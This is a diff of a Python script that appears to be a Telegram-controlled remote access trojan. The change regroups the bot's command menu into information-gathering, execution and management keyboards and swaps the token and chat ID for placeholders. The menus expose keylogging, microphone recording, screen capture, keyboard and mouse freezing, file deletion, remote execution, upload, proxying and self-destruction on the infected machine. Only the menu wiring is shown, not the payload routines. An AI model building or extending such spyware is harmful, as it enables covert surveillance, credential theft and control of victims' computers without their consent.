@@ -48,7 +48,18 @@ def internalIP():
 def on_chat_message(msg):
     # chat_id = msg['chat']['id']
     content_type, chat_type, chat_id = telepot.glance(msg)
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+    info_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text='hear: [time in seconds, default=5s]', callback_data='hear')],
+        [InlineKeyboardButton(text='ip_info', callback_data='ip_info')],
+        [InlineKeyboardButton(text='keylogs', callback_data='keylogs')],
+        [InlineKeyboardButton(text='ls: [target_folder]', callback_data='ls')],
+        [InlineKeyboardButton(text='PC_info', callback_data='pc_info')],
+        [InlineKeyboardButton(text='PWD', callback_data='pwd')],
+        [InlineKeyboardButton(text='Tasklist: Returns the tasklist', callback_data='tasklist')],
+        [InlineKeyboardButton(text='Self_Destruct', callback_data='self_destruct')],
+        [InlineKeyboardButton(text='arp: Returns ARP Table', callback_data='arp')],
+    ])
+    exec_keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text='Capture_PC', callback_data='capture_pc')],
         [InlineKeyboardButton(text='cd: <target_dir>', callback_data='cd')],
         [InlineKeyboardButton(text='Delete: <target_file>', callback_data='delete')],
@@ -57,26 +68,22 @@ def on_chat_message(msg):
         [InlineKeyboardButton(text='unfreeze_keyboard', callback_data='unfreeze_keyboard')],
         [InlineKeyboardButton(text='freeze_mouse', callback_data='freeze_mouse')],
         [InlineKeyboardButton(text='unfreeze_mouse', callback_data='unfreeze_mouse')],
-        [InlineKeyboardButton(text='hear: [time in seconds, default=5s]', callback_data='hear')],
-        [InlineKeyboardButton(text='ip_info', callback_data='ip_info')],
-        [InlineKeyboardButton(text='keylogs', callback_data='keylogs')],
-        [InlineKeyboardButton(text='ls: [target_folder]', callback_data='ls')],
         [InlineKeyboardButton(text='msg_box: <text>', callback_data='msg_box')],
-        [InlineKeyboardButton(text='PC_info', callback_data='pc_info')],
         [InlineKeyboardButton(text='Play: <youtube_videoId>', callback_data='play')],
         [InlineKeyboardButton(text='Proxy', callback_data='proxy')],
-        [InlineKeyboardButton(text='PWD', callback_data='pwd')],
-        [InlineKeyboardButton(text='Tasklist: Returns the tasklist', callback_data='tasklist')],
         [InlineKeyboardButton(text='run <target_file>', callback_data='run')],
         [InlineKeyboardButton(text='Self_Destruct', callback_data='self_destruct')],
-        [InlineKeyboardButton(text='arp: Returns ARP Table', callback_data='arp')],
-        [InlineKeyboardButton(text='Reboot the bot', callback_data='reboot_bot')],
         [InlineKeyboardButton(text='Upload', callback_data='upload')],
+    ])
+    bot_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text='Self_Destruct', callback_data='self_destruct')],
+        [InlineKeyboardButton(text='Reboot the bot', callback_data='reboot_bot')],
         [InlineKeyboardButton(text='Reboot the computer', callback_data='reboot_pc')],
         [InlineKeyboardButton(text='Shutdown the computer', callback_data='shutdown_pc')],
-        [InlineKeyboardButton(text='to: <target_computer>, [other_target_computer]', callback_data='to')]
     ])
-    bot.sendMessage(chat_id, 'Buttons only please', reply_markup=keyboard)
+    bot.sendMessage(chat_id, 'Information Gathering Commands:', reply_markup=info_keyboard)
+    bot.sendMessage(chat_id, 'Executable Commands:', reply_markup=exec_keyboard)
+    bot.sendMessage(chat_id, 'Management Commands:', reply_markup=bot_keyboard)
 
     if checkchat_id(chat_id):
         if 'text' in msg:
@@ -416,7 +423,7 @@ with open(log_file, "a") as writing:
 
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = os.environ['11111111:111111111111111111111111111111111']  # you can set your environment variable as well
-token = '111111111:11111111111111111111111111111111111'
+token = '1111111111:111111111111111111111111111111111'
 
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
 # known_ids = ''
@@ -426,12 +433,12 @@ token = '111111111:11111111111111111111111111111111111'
 
 #appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
 
-known_ids = '29951105'
+known_ids = '11111111'
 bot = telepot.Bot(token)
 bot.message_loop({'chat': on_chat_message,
                   'callback_query': on_callback_query})
 if len(known_ids) > 0:
-    helloWorld = platform.uname()[1] + ": I'm up."
+    helloWorld = platform.uname()[1] + ": I'm up. Type anything to get the keyboard layout."
     print helloWorld
     # for known_id in known_ids:
     bot.sendMessage(known_ids, helloWorld)
